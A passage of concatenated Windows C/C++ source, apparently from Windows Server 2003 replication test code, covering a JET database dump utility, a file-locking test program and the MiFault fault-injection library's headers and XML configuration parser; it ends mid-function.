
/*

typedef struct
        {
        unsigned long   cbStruct;
        JET_TABLEID             tableid;
        unsigned long   cRecord;
        JET_COLUMNID    columnidPresentationOrder;
        JET_COLUMNID    columnidcolumnname;
        JET_COLUMNID    columnidcolumnid;
        JET_COLUMNID    columnidcoltyp;
        JET_COLUMNID    columnidCountry;
        JET_COLUMNID    columnidLangid;
        JET_COLUMNID    columnidCp;
        JET_COLUMNID    columnidCollate;
        JET_COLUMNID    columnidcbMax;
        JET_COLUMNID    columnidgrbit;
        JET_COLUMNID    columnidDefault;
        JET_COLUMNID    columnidBaseTableName;
        JET_COLUMNID    columnidBaseColumnName;
        JET_COLUMNID    columnidDefinitionName;
        } JET_COLUMNLIST;

*/

/*
typedef struct
        {
        unsigned long   cbStruct;
        JET_TABLEID             tableid;
        unsigned long   cRecord;
        JET_COLUMNID    columnidindexname;
        JET_COLUMNID    columnidgrbitIndex;
        JET_COLUMNID    columnidcKey;
        JET_COLUMNID    columnidcEntry;
        JET_COLUMNID    columnidcPage;
        JET_COLUMNID    columnidcColumn;
        JET_COLUMNID    columnidiColumn;
        JET_COLUMNID    columnidcolumnid;
        JET_COLUMNID    columnidcoltyp;
        JET_COLUMNID    columnidCountry;
        JET_COLUMNID    columnidLangid;
        JET_COLUMNID    columnidCp;
        JET_COLUMNID    columnidCollate;
        JET_COLUMNID    columnidgrbitColumn;
        JET_COLUMNID    columnidcolumnname;
        } JET_INDEXLIST;
*/

    printf("-------------------\n   INDEXES \n-------------------\n");

    jerr = JetMove( jsesid, colinfo.tableid, JET_MoveFirst, 0 );

    IListUsed = 0;
    while( jerr == JET_errSuccess ) {

        unsigned long   cb;

        ZeroMemory(rcarray, sizeof(rcarray));

        rcarray[4].pvData   = IList[IListUsed].AttribName;
        rcarray[4].cbData   = sizeof(IList[0].AttribName);
        rcarray[4].columnid = colinfo.columnidindexname;
        rcarray[4].itagSequence = 1;

        rcarray[1].pvData   = &IList[IListUsed].colid;
        rcarray[1].cbData   = sizeof(IList[0].colid);
        rcarray[1].columnid = colinfo.columnidcolumnid;
        rcarray[1].itagSequence = 1;

        rcarray[2].pvData   = &IList[IListUsed].coltyp;
        rcarray[2].cbData   = sizeof(IList[0].coltyp);
        rcarray[2].columnid = colinfo.columnidcoltyp;
        rcarray[2].itagSequence = 1;

        rcarray[3].pvData   = &IList[IListUsed].grbit;
        rcarray[3].cbData   = sizeof(IList[0].grbit);
        rcarray[3].columnid = colinfo.columnidgrbitIndex;
        rcarray[3].itagSequence = 1;

        rcarray[0].pvData   = &IList[IListUsed].key;
        rcarray[0].cbData   = sizeof(IList[0].key);
        rcarray[0].columnid = colinfo.columnidcKey;
        rcarray[0].itagSequence = 1;

        jerr = JetRetrieveColumns(jsesid, colinfo.tableid, rcarray, 5 );

        jerr = JetMove( jsesid, colinfo.tableid, JET_MoveNext, 0 );
        IListUsed++;
    }

    for (i=0;i<IListUsed;i++) {
        printf("%25s %s %08x %3d\n",
               IList[i].AttribName,
               JetColumnTypeNames[IList[i].coltyp],
               IList[i].grbit,
               fDumpColId?IList[i].colid:0);
    }
}



void
DumpAttributes(
    JET_SESID jsesid,
    JET_COLUMNLIST colinfo
    )
{
    JET_ERR  jerr;
    unsigned long  iRecord;
    JET_RETRIEVECOLUMN rcarray[4];
    DWORD i=0;
    unsigned long   cb;

/*

typedef struct
        {
        unsigned long   cbStruct;
        JET_TABLEID             tableid;
        unsigned long   cRecord;
        JET_COLUMNID    columnidPresentationOrder;
        JET_COLUMNID    columnidcolumnname;
        JET_COLUMNID    columnidcolumnid;
        JET_COLUMNID    columnidcoltyp;
        JET_COLUMNID    columnidCountry;
        JET_COLUMNID    columnidLangid;
        JET_COLUMNID    columnidCp;
        JET_COLUMNID    columnidCollate;
        JET_COLUMNID    columnidcbMax;
        JET_COLUMNID    columnidgrbit;
        JET_COLUMNID    columnidDefault;
        JET_COLUMNID    columnidBaseTableName;
        JET_COLUMNID    columnidBaseColumnName;
        JET_COLUMNID    columnidDefinitionName;
        } JET_COLUMNLIST;

*/


    jerr = JetMove( jsesid, colinfo.tableid, JET_MoveFirst, 0 );

    AListUsed = 0;
        while( jerr == JET_errSuccess ) {


        ZeroMemory(rcarray, sizeof(rcarray));

        rcarray[0].pvData   = AList[AListUsed].AttribName;
        rcarray[0].cbData   = sizeof(AList[0].AttribName);
        rcarray[0].columnid = colinfo.columnidcolumnname;
        rcarray[0].itagSequence = 1;

        rcarray[1].pvData   = &AList[AListUsed].colid;
        rcarray[1].cbData   = sizeof(AList[0].colid);
        rcarray[1].columnid = colinfo.columnidcolumnid;
        rcarray[1].itagSequence = 1;

        rcarray[2].pvData   = &AList[AListUsed].coltyp;
        rcarray[2].cbData   = sizeof(AList[0].coltyp);
        rcarray[2].columnid = colinfo.columnidcoltyp;
        rcarray[2].itagSequence = 1;

        rcarray[3].pvData   = &AList[AListUsed].grbit;
        rcarray[3].cbData   = sizeof(AList[0].grbit);
        rcarray[3].columnid = colinfo.columnidgrbit;
        rcarray[3].itagSequence = 1;

        jerr = JetRetrieveColumns(jsesid, colinfo.tableid, rcarray, 4);

        jerr = JetMove( jsesid, colinfo.tableid, JET_MoveNext, 0 );
        AListUsed++;
    }


    int next=0;
    for (i=0;i<AListUsed;i++)
    {
        printf("%25s %s %08x %3d\n",
               AList[i].AttribName,
               JetColumnTypeNames[AList[i].coltyp],
               AList[i].grbit,
               fDumpColId?AList[i].colid:0);

        List[next]=i;
        AList[i].Display=TRUE;

        //
        // If it's a favorite stick it out first in the record dump.
        //
        if (strcmp(AList[i].AttribName,"FileName")==0) {
            List[next] = List[0];  List[0] = i;
        }
        else if (strcmp(AList[i].AttribName,"VersionNumber")==0) {
            List[next] = List[1];  List[1]=i;
        }
        else if (strcmp(AList[i].AttribName,"FileGuid")==0) {
            List[next] = List[2];  List[2]=i;
        }
        else if (strcmp(AList[i].AttribName,"FileID")==0) {
            List[next] = List[3];  List[3]=i;
        }
        else if (strcmp(AList[i].AttribName,"EventTime")==0) {
            List[next] = List[4];  List[4]=i;
        }
        else if (strcmp(AList[i].AttribName,"FileWriteTime")==0) {
            List[next] = List[5];  List[5]=i;
        }
        else if (strcmp(AList[i].AttribName,"ParentGuid")==0) {
            List[next] = List[6];  List[6]=i;
        }
        else if (strcmp(AList[i].AttribName,"ParentFileID")==0) {
            List[next] = List[7];  List[7]=i;
        }

        next += 1;

    }
}


void DBDumpTable(
    JET_SESID jsesid,
    JET_DBID jdbid,
    char * szTbName
    )
{
    JET_ERR jerr;
    JET_TABLEID jtid;

    jerr = JetOpenTable(jsesid, jdbid, szTbName, NULL, 0, 0, &jtid);
    if (jerr != JET_errSuccess) {
        printf( "DBDumpTable: JetOpenTable returned %d\n", jerr );
        goto CLOSE_TABLE;
    }

    jerr = JetMove( jsesid, jtid, JET_MoveFirst, 0 );

    while (!jerr) {
        DBDumpRecord( jsesid,jtid);
        jerr = JetMove( jsesid, jtid, JET_MoveNext, 0 );
    }

CLOSE_TABLE:

    jerr = JetCloseTable( jsesid, jtid );
    if (jerr != JET_errSuccess) {
        printf( "DBDumpTable: JetCloseTable returned %d\n", jerr );
    }

    return;
}


char*
PVoidToStr(
    PVOID obuff,
    JET_COLTYP coltyp,
    DWORD cbActual
    )
{
    static char buff[512];
    ULONG data;
    LONGLONG lidata;

    ZeroMemory(buff,sizeof(buff));

    switch (coltyp) {

        case JET_coltypNil:
            sprintf(buff,"%s","NULL ");
            break;

        case JET_coltypBit:
            data = (ULONG) *(PCHAR)obuff;
            sprintf(buff," %d ", data);
            break;

        case JET_coltypUnsignedByte:
            sprintf(buff," %d ", *(DWORD*)obuff);
            break;

        case JET_coltypShort:
            sprintf(buff," %d ", *(DWORD*)obuff);
            break;

        case JET_coltypLong:
            sprintf(buff," %d ", *( DWORD *) obuff);
            break;

        case JET_coltypCurrency:
            CopyMemory(&lidata, obuff, 8);
            sprintf(buff," %12Ld ", lidata);
            break;

        case JET_coltypIEEESingle:
            sprintf(buff," %s ", "???");
            break;

        case JET_coltypIEEEDouble:
            sprintf(buff," %s ", "???");
            break;

        case JET_coltypDateTime:
            CopyMemory(&lidata, obuff, 8);
            sprintf(buff," %12Ld ", lidata);
            break;

        case JET_coltypBinary:
            sprintf(buff," %s ", "???");
            break;

    case JET_coltypText:
            sprintf(buff," %*.*ws ",cbActual, cbActual, ( WCHAR *) obuff);
            //sprintf(buff," %25ws ", (WCHAR*)obuff);
            break;

        case JET_coltypLongBinary:
            sprintf(buff," %25ws ", "???");
            break;

        case JET_coltypLongText:
            sprintf(buff," %25ws ", (WCHAR*)obuff);
            break;

        case JET_coltypMax:
            sprintf(buff," %s ", "???");
            break;

        default:
            sprintf(buff,"UNKNOWN %d ", coltyp);
   }

   return buff;
}


void DBDumpRecord( JET_SESID jsesid,JET_TABLEID jtid)
{
    JET_RETINFO ri;

    DWORD i;
    char obuff[2048];
    JET_ERR jerr;
    DWORD cbActual;
    char recbuff[2048];
    char* ptr=recbuff;

    ZeroMemory(&ri,sizeof(ri));

    for (i=0;i<AListUsed;i++)
    {
        if (!fDumpAll && !AList[List[i]].Display) {
            continue;
        }

        jerr = JetRetrieveColumn (
            jsesid,
            jtid,
            AList[List[i]].colid,
            obuff,
            sizeof(obuff),
            &cbActual,
            0,
            NULL);

        if (jerr != 0) {
            continue;
        }

        ptr += sprintf(ptr,"%s = %s",
                       AList[List[i]].AttribName,
                       PVoidToStr(obuff,AList[List[i]].coltyp,cbActual));
    }

    *ptr='\0';

    printf(">>%s\n",recbuff);
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\lockfile\lockfile.c ===
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<windows.h>

DWORD FileCreate(WCHAR *FileName, WCHAR *Time);
DWORD DirCreate(WCHAR *FileName, WCHAR *Time, WCHAR *Modify, WCHAR *buf, WCHAR *Time2);

PWCHAR *
MainConvertArgV(
    DWORD ArgC,
    PCHAR *ArgV
    )
/*++
Routine Description:
    Convert short char ArgV into wide char ArgV

Arguments:
    ArgC    - From main
    ArgV    - From main

Return Value:
    Address of the new ArgV
--*/
{
#undef DEBSUB
#define DEBSUB "MainConvertArgV:"

    PWCHAR  *wideArgV;

    wideArgV = (PWCHAR*)malloc((ArgC + 1) * sizeof(PWCHAR));
    wideArgV[ArgC] = NULL;

    while (ArgC-- >= 1) {
        wideArgV[ArgC] = (PWCHAR)malloc((strlen(ArgV[ArgC]) + 1) * sizeof(WCHAR));
        wsprintf(wideArgV[ArgC], L"%hs", ArgV[ArgC]);

        if (wideArgV[ArgC]) {
            _wcslwr(wideArgV[ArgC]);
        }
    }
    return wideArgV;
}

VOID __cdecl
main(DWORD argc, CHAR **argv)
{

	if(argc != 3) {
		printf("Usage\n");
		printf("lockedfile <filename> file|dir <time in seconds> 0|1 <change> <time in seconds>\n");
		printf("<filename>: name of the file or dir to lock\n");
		printf("file|dir: file if a file is locked, dir if a dir is locked\n");
		printf("<time in seconds>: time to hold locked file or dir before modifying\n");
		printf("0|1: 1 if there is to be a modification, 0 if not\n");
		printf("<change>: name of file to create if dir locked, else buffer to overwrite file with\n");
		printf("<time in seconds>: time to hold locked file after modification");

		return;
	}

    ArgV = MainConvertArgV(argc, argv);

    FileCreate(ArgV[1], ArgV[2]);

//    DirCreate(argv[1], argv[3], argv[4], argv[5], argv[6]);

}


DWORD FileCreate(WCHAR *FileName, WCHAR *Time)
{
    HANDLE hFile;
	DWORD Duration;
	ULONG written = 0;


	hFile = CreateFile(FileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	SleepEx(10*1000, FALSE);

//WriteFile(hFile, buf, 2*(wcslen(buf)+1), &written, NULL);

	CloseHandle(hFile);
	return 0;

}


DWORD DirCreate(WCHAR *FileName, WCHAR *Time, WCHAR *Modify, WCHAR *buf, WCHAR *Time2)
{
    HANDLE hFile, hFile2;
	DWORD Duration;
	ULONG written = 0;
	WCHAR path[MAX_PATH];


	hFile = CreateFile(FileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);


	if(hFile == INVALID_HANDLE_VALUE) {
		printf("directory open failed. GLE = %d\n", GetLastError());
		return 1;
	}
	Duration = wcstol(Time, NULL, 10); 
	
	SleepEx(Duration*1000, FALSE);
	if(!wcscmp(Modify, L"1")) {
		wcscpy(path, FileName);
		wcscat(path, L"\\");
		wcscat(path, buf);

		hFile2 = CreateFile(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if(hFile2 == INVALID_HANDLE_VALUE) {
			printf("file (%S) create failed. GLE = %d\n",path, GetLastError());
			return 1;
		}
		WriteFile(hFile2, L"test", 12, &written, NULL);
		CloseHandle(hFile2);
		wprintf(L"File %s created.\n",path);
	}
	Duration = wcstol(Time2, NULL, 10); 
	SleepEx(Duration*1000, FALSE);
	CloseHandle(hFile);
	return 0;


}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\inc\mifault.h ===
#pragma once

#include <AutoWrap.h>
#include <InjRT.h>

#define MIFAULT_VERSION "MiFault Version 0.1"

namespace MiFaultLib {
#if 0
}
#endif

typedef void (WINAPI *FP_CleanupParsedArgs)(void*);


struct Arg {
    const char* Name;
    const char* Value;
};


// There are not COM interfaces, but they are interfaces, so we use
// "I_" instead of "I" as a prefix.

class I_Args {
public:
    virtual const size_t WINAPI GetCount() = 0;

    // The index must be valid
    virtual const Arg    WINAPI GetArg(size_t index) = 0;

    // Returns NULL if there is no such named argument
    // virtual const char*  WINAPI GetArg(const char* name) = 0;

    // GetParsedArgs
    //
    //   Returns a pointer to parsed arguments or NULL if none is set.
    //   If you ned to denote empty parsed arguments, make sure to set
    //   the parsed arguments to some data structure.
    virtual void* WINAPI GetParsedArgs() = 0;

    // SetParsedArgs
    //
    //   This function should be called once to set the args.  Returns
    //   false and does nothing if the args have already been set.
    //   ParsedArgs and pfnCleanup must not be NULL, otherwise an
    //   assertion will fail.  If you have the concept of empty
    //   args, you should put some struct here to signify that.
    virtual bool WINAPI SetParsedArgs(
        IN void* ParsedArgs,
        IN FP_CleanupParsedArgs pfnCleanup
        ) = 0;

    // Lock/Unlock (OPTIONAL)
    //
    //   Synchronization mechanism that can be used for setting parsed
    //   arguments.  A fault function can use this do synchronize with
    //   other fault function when modifying the parsed arguments for
    //   this paramters block.
    //
    //   Calling these functions is optional.  However, if you use
    //   them, make sure that they are properly matched up.

    virtual void WINAPI Lock() = 0;
    virtual void WINAPI Unlock() = 0;

    // Done (OPTIONAL)
    //
    //   Can be used to indicate that the fault function is done using
    //   the argument information.  The fault function cannot access
    //   any data corresponding to these arguments.  Calling this
    //   function is optional.  It simply tells the MiFault library
    //   that the fault function has no references to the arguments so
    //   that the MiFault library can free up the data, if
    //   appropriate.
    //
    //   You cannot access the parsed args after this because they
    //   could get freed.
    //
    //   You cannot call any functions on this interface after calling
    //   Done().  Think of it like a super-Release() on a COM
    //   interface.
    //
    //   Note that Get*Args() will always give you the same I_Args
    //   (well, different ones for function and group args, of
    //   course), so you cannot call that function again to get a
    //   valid I_Arg after calling Done().

    virtual void WINAPI Done() = 0;

};


class I_Trigger
{
public:
    virtual const char* WINAPI GetGroupName() = 0;
    virtual const char* WINAPI GetTagName() = 0;
    virtual const char* WINAPI GetFunctionName() = 0;
    virtual const size_t WINAPI GetFunctionIndex() = 0;

    virtual I_Args* WINAPI GetFunctionArgs() = 0;
    virtual I_Args* WINAPI GetGroupArgs() = 0;

    // Done (OPTIONAL)
    //
    //   Can be used to indicate that the fault function is done using
    //   the trigger and argument information.  The fault function
    //   cannot access data corresponding to this trigger after
    //   calling this.  Calling this function is optional.  It simply
    //   tells the MiFault library that the fault function has no
    //   references to the trigger or its arguments so that the
    //   MiFault library can free up the data, if appropriate.
    //
    //   You cannot call any functions on this interface after calling
    //   Done().  Nor can you dereference I_Arg pointers you got from
    //   the trigger.  Think of it like a super-Release() on a COM
    //   interface.
    //
    //   Note that GetTriggerInfo() will always give you the same
    //   I_Trigger, so you cannot call it again to get a valid
    //   I_Trigger after calling Done().

    virtual void WINAPI Done() = 0;

};


class I_Lib {
public:
    // GetTriggerInfo
    //
    //   Returns thread state currently associated with a trigger.
    //   This function must only be called from within a fault
    //   function.

    virtual I_Trigger* WINAPI GetTrigger() = 0;

    virtual void __cdecl Trace(unsigned int level, const char* format, ...) = 0;

    virtual void* WINAPI GetOriginalFunctionAddress() = 0;
    virtual void* WINAPI GetPublishedFunctionAddress(const char* FunctionName) = 0;

    // We don't really want the fault function library to have acccess
    // to magellan.  Rather, we want to provide it with some sort of
    // logging facility and possibly a config system...  Maybe what we
    // want is just to give people pointers to a couple of these...

    // Support function if fault function wants to use Magellan

    // virtual CSetPointManager* WINAPI GetSetPointManager() = 0;
    // virtual const CWrapperFunction* WINAPI GetWrapperFunctions() = 0;
};


#define MiFF_DEBUG4   0x08000000
#define MiFF_DEBUG3   0x04000000
#define MiFF_DEBUG2   0x02000000
#define MiFF_DEBUG    0x01000000

#define MiFF_INFO4    0x00800000
#define MiFF_INFO3    0x00400000
#define MiFF_INFO2    0x00200000
#define MiFF_INFO     0x00100000

#define MiFF_WARNING  0x00040000
#define MiFF_ERROR    0x00020000
#define MiFF_FATAL    0x00010000


// ----------------------------------------------------------------------------
//
// The fault function library should provide:
//


// MiFaultFunctionsStartup
//
//   User-provided function to initialize user-provided fault function
//   component.  It is called before any fault functions are running.
//   The version is just a string that should be compared to
//   MIFAULT_VERSION.  If they do not match, false should be returned.
bool
WINAPI
MiFaultFunctionsStartup(
    const char* version,
    I_Lib* pLib
    );


// MiFaultFunctionsShutdown
//
//   User-provided function to cleanup user-provided fault function
//   component state.  It might not be called all before the fault
//   function library's DllMain.  If called, this function will only
//   be called when no fault functions are running.
void
WINAPI
MiFaultFunctionsShutdown(
    );



// ----------------------------------------------------------------------------
// Sample Fault Function:
//
// using namespace MiFaultLib
//
// CFooFuncArgs* GetFooFuncArgs()
// {
//     I_Args* pArgs = pLib->GetTrigger()->GetFunctionArgs();
//     CFooFuncArgs* pParsedArgs = (CFooFuncArgs*)pArgs->GetParsedArgs();
//     if (!pParsedArgs)
//     {
//         const size_t count = pArgs->GetCount();
//
//         pParsedArgs = new CFooFuncArgs;
//
//         for (size_t i = 0; i < count; i++)
//         {
//             Arg arg = pArgs->GetArg(i);
//             // build up parsed args...
//         }
//         if (!pArgs->SetParsedArgs(pParsedArgs, CFooFuncArgs::Cleanup))
//         {
//             // someone else set the args while we were building the args
//             delete pParsedArgs;
//             pParsedArgs = pArgs->GetParsedArgs();
//         }
//     }
//     return pParsedArgs;
// }
//
// CBarGroupArgs* GetBarGroupArgs()
// {
//     I_Args* pArgs = pLib->GetTrigger()->GetGroupArgs();
//     CBarGroupArgs* pParsedArgs = (CBarGroupArgs*)pArgs->GetParsedArgs();
//     if (!pParsedArgs)
//     {
//         const size_t count = pArgs->GetCount();
//
//         pParsedArgs = new CBarGroupArgs;
//
//         for (size_t i = 0; i < count; i++)
//         {
//             // ... get args and build up parsed args ...
//         }
//         if (!pArgs->SetParsedArgs(pParsedArgs, CBarGroupArgs::Cleanup))
//         {
//             // someone else set the args while we were building the args
//             delete pParsedArgs;
//             pParsedArgs = pArgs->GetParsedArgs();
//         }
//     }
//     return pParsedArgs;
// }
//
// void FF_Bar_Foo()
// {
//     CFooFuncArgs* pFuncArgs = GetFooFuncArgs();
//     CBarGroupArgs* pGroupArgs = GetBarGroupArgs();
//
//     // Do fault code...
//
//     // No need to cleanup args...library will do that using the
//     // cleanup function pointer.
// }

#if 0
{
#endif
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\inc\mifault_control.h ===
#pragma once

#ifdef __cplusplus
extern "C" {
#endif

#if 0
}
#endif

//
// Can be called by the program to pre-initialize outside critical path
//
BOOL
__stdcall
MiFaultLibStartup(
    );

//
// Can be called by the program to cleanly shutdown
//
void
__stdcall
MiFaultLibShutdown(
    );

#if 0
{
#endif

#ifdef __cplusplus
}
#endif
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\inc\mifault_wrap.h ===
#pragma once


#ifndef MIFAULT_EXPORT
#define MIFAULT_EXPORT __declspec(dllimport)
#endif

namespace MiFaultLib {
#if 0
}
#endif

// Triggered
//
//   Returns function pointer for triggered faulting function, if any.
//   If a function pointer is returned, sets up thread state
//   associated with trigger.

MIFAULT_EXPORT
PVOID
Triggered(
    IN size_t const uFunctionIndex
    );

// TriggerFinished
//
//   Cleans up thread state associated with trigger

MIFAULT_EXPORT
void
TriggerFinished(
    );

MIFAULT_EXPORT
BOOL
FilterAttach(
    HINSTANCE const hInstDLL,
    DWORD const dwReason,
    CSetPointManager* pSetPointManager,
    const CWrapperFunction* pWrappers,
    size_t NumWrappers,
    const char* ModuleName
    );

MIFAULT_EXPORT
BOOL
FilterDetach(
    HINSTANCE const hInstDLL,
    DWORD const dwReason
    );

#if 0
{
#endif
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\src\makefile.inc ===
$(O)\mifault.res: mifault.rc res\groupdefs.xsd res\scenario.xsd
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\src\mim.cxx ===
#include "pch.hxx"

// ----------------------------------------------------------------------------
// MIM - Marker Index Map
//
// The MIM maps a (tag, function) pair into a function index

CMIM::CMIM(
    const CWrapperFunction* Wrappers,
    ULONG uCount
    )
{
    ULONG uIndex;
    for (uIndex = 0; uIndex < uCount; uIndex++) {
        m[Wrappers[uIndex].m_szWrapper] = uIndex;
    }
}


CMIM::~CMIM()
{
}


ULONG
CMIM::Lookup(
    const char* tag,
    const char* function
    ) const
{
    string s = "Wrap_";
    s += tag;
    s += "_";
    s += function;

    iter_t iter = m.find(s);
    if (iter == m.end())
        return NotFound();
    return iter->second;
}


ULONG
CMIM::NotFound() const
{
    return (ULONG) -1;
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\src\confdb.cxx ===
#include "pch.hxx"
#include <cmath> // for pow

// ----------------------------------------------------------------------------

#if 0
// Apparently, the VARIANT that is supposed to be a dateTime is coming
// back as a VT_BSTR with the original text in the element rather than
// as a VT_DATE.  Therefore, we cannot use this code:
FILETIME
GetFileTimeFromVariant(
    _variant_t variant
    )
{
    double date = variant;

    SYSTEMTIME st;
    if (!VariantTimeToSystemTime(date, &st))
    {
        stringstream s;
        s << "Could not convert variant time " << date << " to system time.";
        throw s.str();
    }

    FILETIME ft;
    if (!SystemTimeToFileTime(&st, &ft))
    {
        stringstream s;
        s << "Could not convert system time to file time.";
        throw s.str();
    }

    return ft;
}
#endif


//
// dateTime primitive XML type from:
//
// http://www.w3.org/TR/2001/REC-xmlschema-2-20010502/
//
// CCYY-MM-DDThh:mm:ss[.sss][Z]
// CCYY-MM-DDThh:mm:ss[.sss][+...]
// CCYY-MM-DDThh:mm:ss[.sss][-...]
//
// We silently ignore timezone information
//

FILETIME
GetFileTimeFromVariant(
    _variant_t variant
    )
{
    char* str = _strdup((char*)(_bstr_t)variant);
    if (!str)
        throw WIN32_ERROR(ERROR_NOT_ENOUGH_MEMORY, "_strdup");

    SYSTEMTIME st;
    try {
        stringstream s;
        s << "invalid dateTime (" << str << ")";

        const char* delims = "-T:.Z+";
        char* nexttoken;
        char* p;

        p = strtok_r(str, delims, &nexttoken);
        if (!p)
            throw s.str();

        st.wYear = static_cast<WORD>(atoi(p));

        p = strtok_r(NULL, delims, &nexttoken);
        if (!p)
            throw s.str();

        st.wMonth = static_cast<WORD>(atoi(p));

        p = strtok_r(NULL, delims, &nexttoken);
        if (!p)
            throw s.str();

        st.wDay = static_cast<WORD>(atoi(p));

        p = strtok_r(NULL, delims, &nexttoken);
        if (!p)
            throw s.str();

        st.wHour = static_cast<WORD>(atoi(p));

        p = strtok_r(NULL, delims, &nexttoken);
        if (!p)
            throw s.str();

        st.wMinute = static_cast<WORD>(atoi(p));

        p = strtok_r(NULL, delims, &nexttoken);
        if (!p)
            throw s.str();

        st.wSecond = static_cast<WORD>(atoi(p));

        p = strtok_r(NULL, delims, &nexttoken);
        if (!p)
            st.wMilliseconds = 0;
        else {
            double msec = atoi(p) * pow(10, (3 - strlen(p)));
            st.wMilliseconds = static_cast<WORD>(msec);
        }
    }
    catch (...) {
        free(str);
        throw;
    }

    free(str);

    FILETIME ft;
    if (!SystemTimeToFileTime(&st, &ft)) {
        throw WIN32_ERROR(GetLastError(), "SystemTimeToFileTime");
    }

    return ft;
}

//
// duration primitive XML type from:
//
// http://www.w3.org/TR/2001/REC-xmlschema-2-20010502/
//
// P(nY)?(nM)?(nD)?(T(nH)?(nM)?(nS)?)?
//
// Custom DurationType is superior:
//
// [0-9]+d[0-9]+h[0-9]+m[0-9]+s
//
// 0d0h23m1000s
//

CMTimeSpan
GetDurationFromVariant(
    _variant_t variant
    )
{
    char* str = _strdup((char*)(_bstr_t)variant);
    if (!str)
        throw string("out of memory");

    CMTimeSpan result(0);

    try {
        stringstream s;
        s << "invalid dateTime (" << str << ")";

        const char* delims = "dhms";
        char* nexttoken;
        char* p;

        p = strtok_r(str, delims, &nexttoken);
        if (!p)
            throw s.str();

        int Days = atoi(p);

        p = strtok_r(NULL, delims, &nexttoken);
        if (!p)
            throw s.str();

        int Hours = atoi(p);

        p = strtok_r(NULL, delims, &nexttoken);
        if (!p)
            throw s.str();

        int Minutes = atoi(p);

        p = strtok_r(NULL, delims, &nexttoken);
        if (!p)
            throw s.str();

        int Seconds = atoi(p);

        result = CMTimeSpan(Days, Hours, Minutes, Seconds, 0);
    }
    catch (...) {
        free(str);
        throw;
    }

    free(str);

    return result;
}


FARPROC
MyGetProcAddress(
    const HMODULE& hDll,
    LPCTSTR DllName,
    LPCSTR FunctionName
    ) throw (...)
{
    FARPROC pFunction = GetProcAddress(hDll, FunctionName);

    if (!pFunction) {
        WIN32_ERROR e(GetLastError(), "GetProcAddress");
        stringstream s;
        s << "Cannot find \"" << FunctionName << "\" in \""
          << DllName << "\" (" << e.toString() << ")";
        throw s.str();
    }

    return pFunction;
}

// ----------------------------------------------------------------------------

#pragma warning( push )
#pragma warning( disable : 4355 )


// ----------------------------------------------------------------------------
// CProbability

CProbability::CProbability(Orig_t original):
    m_Original(original),
    m_Representation(static_cast<Rep_t>(original * max))
{
    // the schema already says it should be >0, but let's make sure
    MiF_ASSERT(m_Representation > 0);
}

void
CProbability::Seed()
{
    Seed(static_cast<unsigned int>(time(NULL)));
}

void
CProbability::Seed(unsigned int seed)
{
    srand(seed);
}

CProbability::Rep_t
CProbability::Random()
{
    int r = rand();
#if 0
    // If needed, fix up the distribution
    if (r > ceiling) {
        // We are in a region that does not reflect good
        // distribution.  Since RAND_MAX is 32767, we will get
        // 0-767 slightly more often (1/32) than 768 - 999.

        // ISSUE-2002/07/15-daniloa -- log/fix imperfect distribution?
        while (r > ceiling) {
            r = rand();
        }
    }
#endif
    // 0-999
    return r % max;
}


// ----------------------------------------------------------------------------
// CCase

CCase::CCase(
    IXMLDOMNodePtr ptrNode,
    parent_t* parent
    ):
    CChild<CCase, CMarkerState>(parent),
    m_Probability(GetTypedAttribute(ptrNode, "probability")),
    m_FaultFunction(GetTypedValue(ptrNode, "NS:FaultFunction")),
    m_pfnFaultFunction(0),
    m_Arguments(ptrNode, "NS:Argument", this)
{
    MiF_TRACE(MiF_DEBUG2, "Constructed %s", toString().c_str());
}


CCase::~CCase()
{
    MiF_TRACE(MiF_DEBUG2, "Destroying %s", toString().c_str());
}


void
CCase::LoadFunction() const throw (...)
{
    if (m_pfnFaultFunction)
        return;

    // case, markerstate, group, defs
    const HMODULE& hDll = m_Parent->m_Parent->m_Parent->m_hFaultLibDll;
    const _bstr_t& DllName = m_Parent->m_Parent->m_Parent->m_FaultLibDll;

    m_pfnFaultFunction =
        MyGetProcAddress(hDll,
                         static_cast<LPCTSTR>(DllName),
                         static_cast<LPCSTR>(m_FaultFunction));
}


string
CCase::toString() const
{
    stringstream s;
    s << "Case ("
      << m_Probability.m_Original
      << ", "
      << (char*)m_FaultFunction
      << ")";

    return s.str();
}



// ----------------------------------------------------------------------------
// CMarker

CMarker::CMarker(
    IXMLDOMNodePtr ptrNode,
    parent_t* parent
    ):
    CChild<CMarker, CMarkerState>(parent),
    m_Tag(GetTypedValue(ptrNode, "NS:Tag")),
    m_Function(GetTypedValue(ptrNode, "NS:Function")),
    m_uFunctionIndex(parent->m_Parent->m_Parent->m_MIM.Lookup(m_Tag, m_Function))
{
    // NOTE: We catch the (m_uFunctionIndex == -1) case later when we do
    // further validation while building up the pseudo events
    MiF_TRACE(MiF_DEBUG2, "Constructed %s", toString().c_str());
}


CMarker::~CMarker()
{
    MiF_TRACE(MiF_DEBUG2, "Destroying %s", toString().c_str());
}


string
CMarker::toString() const
{
    stringstream s;

    s << "Marker ("
      << (char*)m_Tag
      << ", "
      << (char*)m_Function
      << ", "
      << (LONG)m_uFunctionIndex
      << ")";

    return s.str();
}



// ----------------------------------------------------------------------------
// CMarkerState

CMarkerState::CMarkerState(
    IXMLDOMNodePtr ptrNode,
    parent_t* parent
    ):
    CChild<CMarkerState, CGroup>(parent),
    m_Probability(GetTypedAttribute(ptrNode, "probability")),
    m_Marker(ptrNode->selectSingleNode("NS:Marker"), this),
    m_Cases(ptrNode, "NS:Case", this)
{
